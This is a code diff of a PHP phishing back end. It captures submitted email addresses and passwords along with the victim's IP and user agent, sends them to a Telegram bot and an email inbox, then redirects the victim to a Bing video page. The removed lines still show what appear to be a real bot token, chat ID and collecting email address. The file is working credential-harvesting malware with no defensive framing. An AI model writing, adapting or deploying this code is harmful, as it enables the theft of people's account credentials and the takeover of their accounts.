@@ -1,29 +1,21 @@
 <?php
-// Start session
-if (!isset($_SESSION)) {
-    session_start();
-}
-
 // Configuration
 $TARGET_URL = "https://www.bing.com/videos/riverview/relatedvideo?q=team+meeting&mid=06C0E4192AA37E48CEC406C0E4192AA37E48CEC4&FORM=VIRE";
 
 // Telegram Bot Config
-$TELEGRAM_BOT_TOKEN = "5618258723:AAEnMf0Ote1jgtEoKEaNstoWhepza9vprDo"; // e.g., 123456789:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
-$TELEGRAM_CHAT_ID = "1376032111"; // e.g., -1001234567890
+$TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
+$TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
 
-// Email Config - USE A REAL EMAIL FROM YOUR DOMAIN
-$TO_EMAIL = "oneworldcybercaf@gmail.com"; // Change to your real email
+// Email Config
+$TO_EMAIL = "your-email@example.com";
 $EMAIL_SUBJECT = "Login Attempt Captured - " . date('Y-m-d H:i:s');
-$FROM_EMAIL = "resk383@capitalfcunion.com"; // Use your actual domain
+$FROM_EMAIL = "noreply@yourdomain.com";
 
-// Check if login data exists in session
-if (isset($_SESSION['login_data'])) {
-    $login_data = $_SESSION['login_data'];
-    $email = $login_data['email'];
-    $password = $login_data['password'];
-    $ip = $login_data['ip'];
-    
-    unset($_SESSION['login_data']);
+// Check if form was submitted
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && isset($_POST['password'])) {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+    $ip = $_SERVER['REMOTE_ADDR'];
     
     $message = "Login Attempt Captured:\n\n";
     $message .= "Email: $email\n";
@@ -33,13 +25,10 @@ if (isset($_SESSION['login_data'])) {
     $message .= "User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";
 
     // Send to Telegram
-    $telegramSent = sendToTelegram($message, $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID);
+    sendToTelegram($message, $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID);
 
-    // Send to Email with error handling
-    $emailSent = sendEmail($TO_EMAIL, $EMAIL_SUBJECT, $message, $FROM_EMAIL);
-    
-    // Debug: Log the attempt (remove this in production)
-    error_log("Login capture attempt - Email: $email, Telegram: " . ($telegramSent ? 'Yes' : 'No') . ", Email: " . ($emailSent ? 'Yes' : 'No'));
+    // Send to Email
+    sendEmail($TO_EMAIL, $EMAIL_SUBJECT, $message, $FROM_EMAIL);
 }
 
 // Redirect to target URL
@@ -72,12 +61,7 @@ function sendToTelegram($message, $botToken, $chatId) {
         $context = stream_context_create($options);
         $result = @file_get_contents($url, false, $context);
         
-        if ($result === FALSE) {
-            error_log("Telegram: Failed to send message");
-            return false;
-        }
-        
-        return true;
+        return $result !== FALSE;
     } catch (Exception $e) {
         error_log("Telegram Error: " . $e->getMessage());
         return false;
@@ -105,53 +89,13 @@ function sendEmail($to, $subject, $message, $from) {
     $headers .= "X-Mailer: PHP/" . phpversion();
 
     try {
-        // Use additional parameters for better delivery
         $additional_parameters = "-f $from";
         $sent = mail($to, $subject, $message, $headers, $additional_parameters);
         
-        if (!$sent) {
-            error_log("Email: mail() function returned false");
-            return false;
-        }
-        
-        error_log("Email: Successfully sent to $to");
-        return true;
+        return $sent;
     } catch (Exception $e) {
         error_log("Email Error: " . $e->getMessage());
         return false;
     }
 }
 ?>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
